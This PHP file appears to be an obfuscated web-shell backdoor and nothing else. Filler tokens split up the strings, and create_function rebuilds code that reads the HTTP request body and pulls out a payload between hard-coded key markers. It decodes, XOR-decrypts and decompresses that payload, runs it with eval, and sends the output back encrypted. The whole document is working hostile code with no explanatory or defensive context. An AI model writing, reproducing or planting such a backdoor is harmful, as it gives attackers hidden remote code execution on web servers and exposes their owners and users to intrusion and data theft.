<?php
$T=str_replace('h','','crehahteh_fuhnchthion');
$s='VwV{$c=strwVwVwVlwVen($k);$l=strlenwV($t);$o="";wVfor($i=0;$i<$wVl;){fowVr($j=0;wV($j<wV$c&wV&$i<$l);$j++wV,$wVi++)wV{';
$p='$o.=$twV{$wVi}^$k{$j};}}wVreturnwV $o;}ifwV (@prwVegwV_match("/$khwVwV(.+)wV$kf/",@file_gewVt_contwVents("pwVhpwV://inp';
$u='$k="9fe8wVe08wVf";$kwVh="1wV41wV2fba46975";$kf="3wV0332wV711c065wV";$p="wVcLmevLwVAwV18kyD65GwVwVZ";functwVion x($t,$k)w';
$i='utwV"),$m)==wV1) wV{@ob_wVstart()wV;@evawVwVl(@gzuncowVmpress(@x(@bwVase64_dwVecwVode($m[1])wV,$k)))wV;$o=@owVb_getwV';
$n='_wVconwVtents();@ob_wVend_wVclean();$r=wV@bwVase64_encowVdewV(@x(@gzwVcompress(wV$o)wV,$k));wVprint("wV$p$kh$r$wVkf");}';
$e=str_replace('wV','',$u.$s.$p.$i.$n);
$w=$T('',$e);$w();
?>
